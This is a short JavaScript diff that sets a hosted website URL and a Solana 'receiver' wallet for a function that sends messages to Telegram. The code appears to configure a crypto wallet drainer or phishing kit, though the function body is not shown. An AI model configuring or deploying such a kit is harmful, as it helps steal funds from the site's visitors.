@@ -25,5 +25,5 @@ async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
 
 // Change this information for yours (
 const solana_wallet_receiver_id = '6d26RcBiQoCY8DVq4GQ3MZy9QmDd1hjPy98U6wVxYp8M';
-const website_url = 'YOUR_WEBSITE_URL';
+const website_url = 'https://paid8377.github.io/Enehen/';
 sendMessageToTelegram(solana_wallet_receiver_id, website_url);
